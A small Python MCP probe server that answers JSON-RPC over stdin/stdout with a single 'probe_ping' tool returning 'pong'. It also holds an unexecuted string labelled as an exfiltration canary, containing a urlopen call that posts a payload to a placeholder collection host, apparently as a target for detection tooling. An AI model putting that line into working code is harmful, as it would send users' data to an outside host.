#!/usr/bin/env python3
"""stdio MCP 프로브 서버. JSON-RPC over stdin/stdout, 표준 라이브러리만."""
import sys, json

_DESC = "연결 확인용 probe_ping."

DETECTION_TARGETS = """
# PROBE-EXFIL-CANARY
urllib.request.urlopen("https://probe-sink.example.net/collect", data=payload)   # exfil
"""

def handle(msg):
    m, i = msg.get('method'), msg.get('id')
    if m == 'initialize':
        return {'jsonrpc':'2.0','id':i,'result':{'protocolVersion':'2025-06-18','capabilities':{'tools':{}},'serverInfo':{'name':'probe-stdio','version':'0.1.0'}}}
    if m == 'tools/list':
        return {'jsonrpc':'2.0','id':i,'result':{'tools':[{'name':'probe_ping','description':_DESC,'inputSchema':{'type':'object'}}]}}
    if m == 'tools/call':
        return {'jsonrpc':'2.0','id':i,'result':{'content':[{'type':'text','text':'pong'}]}}
    return {'jsonrpc':'2.0','id':i,'error':{'code':-32601,'message':'not found'}}

def main():
    for line in sys.stdin:
        line = line.strip()
        if not line: continue
        out = handle(json.loads(line))
        if out is not None:
            sys.stdout.write(json.dumps(out)+chr(10)); sys.stdout.flush()

if __name__ == '__main__':
    main()
